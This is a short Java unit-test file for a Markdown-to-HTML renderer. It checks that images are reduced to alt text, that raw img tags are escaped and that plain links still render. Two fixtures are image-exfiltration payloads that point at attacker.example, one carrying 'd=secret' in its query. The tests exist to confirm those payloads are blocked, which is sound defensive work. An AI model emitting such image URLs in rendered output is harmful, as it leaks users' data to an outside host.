package dev.marregui.comando.ui.kit.text;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

class MarkdownHtmlTest {

    @Test
    void anImageBecomesItsAltTextAndItsUrlIsNotRendered() {
        String html = MarkdownHtml.render("Plan ![status of <b>x</b>](https://attacker.example/p.png?d=secret) done");
        assertThat(html).doesNotContain("<img").doesNotContain("attacker.example").contains("<i>status of x</i>");
    }

    @Test
    void rawHtmlImagesAreEscaped() {
        assertThat(MarkdownHtml.render("<img src=\"https://attacker.example/p.png\">")).doesNotContain("<img");
    }

    @Test
    void linksStayLinks() {
        assertThat(MarkdownHtml.render("[docs](https://example.org/a)")).contains("href=\"https://example.org/a\">docs</a>");
    }
}
